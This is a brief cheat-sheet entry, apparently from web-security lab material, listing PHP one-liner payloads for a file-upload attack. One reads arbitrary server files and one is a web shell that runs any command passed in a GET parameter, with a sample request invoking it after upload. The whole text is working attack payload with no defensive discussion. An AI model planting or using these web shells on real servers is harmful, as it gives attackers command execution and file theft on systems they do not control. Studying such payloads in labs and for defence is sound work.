## PHP One-liners

Read arbitrary files from the server's filesystem:
`<?php echo file_get_contents('/path/to/target/file'); ?>`

Pass an arbitrary system command via a query parameter:
`<?php echo system($_GET['command']); ?>`
Once uploaded: `GET /example/exploit.php?command=whoami HTTP/1.1`



